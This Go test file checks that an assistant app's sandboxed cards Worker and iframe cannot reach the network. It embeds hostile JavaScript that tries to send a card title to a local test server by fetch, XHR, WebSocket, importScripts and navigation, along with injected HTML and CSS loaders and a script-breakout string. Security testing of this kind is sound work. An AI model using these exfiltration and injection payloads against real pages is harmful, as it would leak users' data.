package web

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"sync"
	"testing"
	"time"

	"github.com/z-chenhao/assistant/internal/agent"
	"github.com/z-chenhao/assistant/internal/delivery/ui"
)

type cardsWorkerCore struct {
	identityCore
	views map[string]ui.CardsView
}

func (c cardsWorkerCore) WebCardsView(_ context.Context, ref string) (ui.CardsView, error) {
	v, ok := c.views[ref]
	if !ok {
		return ui.CardsView{}, agent.ErrNotFound
	}
	return v, nil
}

// Actual protected HTTP/CSP, fixed Host DOM driver and owning Worker. Accepted
// output/domain grants are fixtures, not a full managed App/SQLite proof.
func TestUICardsWorkerBrowserIsolationAndBoundedProjection(t *testing.T) {
	if os.Getenv("STEWARD_TEST_APP_BROWSER") != "1" {
		t.Skip("run by make test-browser")
	}
	read := func(path string) []byte {
		t.Helper()
		data, err := os.ReadFile(path)
		if err != nil {
			t.Fatal(err)
		}
		return data
	}
	var original struct {
		HTML string `json:"initial_html"`
	}
	if err := json.Unmarshal(read("../../plugin/intelligentui/testdata/original-cards.json"), &original); err != nil {
		t.Fatal(err)
	}
	initial := original.HTML
	var mu sync.Mutex
	var requests []string
	peer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		mu.Lock()
		requests = append(requests, r.URL.RequestURI())
		mu.Unlock()
		w.Header().Set("Access-Control-Allow-Origin", "*")
		_, _ = w.Write([]byte("synthetic destination"))
	}))
	defer peer.Close()
	target, _ := json.Marshal(peer.URL)
	owning := string(read("../../plugin/intelligentui/view/cards-worker.js"))
	attack := `"use strict";if(typeof document!=='undefined'||typeof parent!=='undefined')throw Error('candidate unexpectedly has DOM');globalThis.WORKER_ONLY_MARKER='candidate ran';const payload="</script><script>globalThis.DOM_ESCAPE=true</script>";` + owning + `
const originalHandler=onmessage;onmessage=event=>{if(event.data.type==='init'){const url=` + string(target) + `+'/synthetic?value='+encodeURIComponent(event.data.titles[0]);try{location.replace(url)}catch{}try{location.href=url}catch{}try{fetch(url).catch(()=>{})}catch{}try{importScripts(url)}catch{}try{const req=new XMLHttpRequest();req.open('GET',url);req.send()}catch{}try{const ws=new WebSocket(url.replace('http:','ws:'));ws.onerror=()=>{}}catch{}try{indexedDB.open('synthetic-worker-storage');throw Error('opaque worker gained storage')}catch(error){if(error.name!=='SecurityError')throw error}}originalHandler(event)};`
	view := ui.CardsView{HTML: initial, CSS: string(read("../../plugin/intelligentui/view/cards.css")), Worker: attack, Styles: read("assets/widget.css"), CompactMaxWidth: 760}
	// Malicious markup and CSS must not bypass the non-DOM Worker boundary.
	view.HTML += `<meta http-equiv="refresh" content="0;url=` + peer.URL + `/meta"><img src="` + peer.URL + `/image"><svg><image href="` + peer.URL + `/svg"></image></svg><script>location.replace('` + peer.URL + `/dom')</script>`
	view.CSS += `.native-carousel{background-image:url('` + peer.URL + `/css')}`
	views := map[string]ui.CardsView{"ui:original#1": view}
	for name, code := range map[string]string{
		"invalid":     `onmessage=event=>postMessage({seq:event.data.seq,type:'ready',projection:{index:999999}})`,
		"unsolicited": `onmessage=event=>{postMessage({seq:event.data.seq,type:'ready',prefetchMargin:240,projection:{index:0,previousDisabled:true,nextDisabled:false,counter:'1 / 2',selected:[false,false]}});postMessage({type:'select',seq:999999,item:0})}`,
		"loop":        `onmessage=()=>{while(true){}}`,
	} {
		copy := view
		copy.Worker = code
		views["ui:"+name+"#1"] = copy
	}
	core := cardsWorkerCore{views: views}
	s := &Server{Core: core, Config: Config{TokenRef: "credential:test"}, Secrets: fakeSecrets{}}
	host := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/fixture" {
			ref := r.URL.Query().Get("ref")
			if _, ok := views[ref]; !ok {
				http.NotFound(w, r)
				return
			}
			_, _ = w.Write([]byte(`<!doctype html><link rel="stylesheet" href="/style.css"><iframe sandbox="allow-scripts" style="width:800px;height:600px;border:0" id="cards"></iframe><script>window.messages=[];const frame=document.getElementById('cards');addEventListener('message',event=>{if(event.source!==frame.contentWindow||event.origin!=='null'||event.data?.channel!=='steward-cards-view')return;messages.push(event.data);if(event.data.type==='ready'){const style=getComputedStyle(document.documentElement),tokens={};for(const key of ['--card','--border','--foreground','--muted-foreground','--hover','--font-ui','--control-border'])tokens[key]=style.getPropertyValue(key).trim();frame.contentWindow.postMessage({channel:'steward-cards-view',type:'theme',theme:'light',locale:Intl.Collator().resolvedOptions().locale,language:'en',viewportWidth:innerWidth,tokens},'*');frame.contentWindow.postMessage({channel:'steward-cards-view',type:'restore',state:{index:1},selected:'Beta'},'*')}});frame.src='/ui/cards?ref='+encodeURIComponent(` + mustCardsJSString(t, ref) + `);</script>`))
			return
		}
		s.ServeHTTP(w, r)
	}))
	defer host.Close()
	evidence := t.TempDir()
	if path := os.Getenv("STEWARD_APP_BROWSER_EVIDENCE"); path != "" {
		evidence = filepath.Join(path, "cards-worker")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 50*time.Second)
	defer cancel()
	if out, err := exec.CommandContext(ctx, "node", "../../../guest-browser/cards-worker-http.mjs", host.URL, evidence).CombinedOutput(); err != nil {
		t.Fatalf("Cards Worker browser: %v\n%s", err, out)
	}
	mu.Lock()
	defer mu.Unlock()
	if len(requests) != 0 {
		t.Fatal("candidate escaped through navigation/network", requests)
	}
	report := struct {
		Scope        string   `json:"scope"`
		Requests     []string `json:"requests"`
		ZeroRequests bool     `json:"zero_requests"`
	}{"actual temporary HTTP observer after candidate navigation/fetch/XHR/importScripts/WebSocket and resource attempts", append([]string{}, requests...), true}
	data, err := json.MarshalIndent(report, "", "  ")
	if err != nil {
		t.Fatal(err)
	}
	if err = os.WriteFile(filepath.Join(evidence, "network-observer.json"), append(data, '\n'), 0600); err != nil {
		t.Fatal(err)
	}
}

func mustCardsJSString(t *testing.T, value string) string {
	t.Helper()
	raw, err := json.Marshal(value)
	if err != nil {
		t.Fatal(err)
	}
	return string(raw)
}
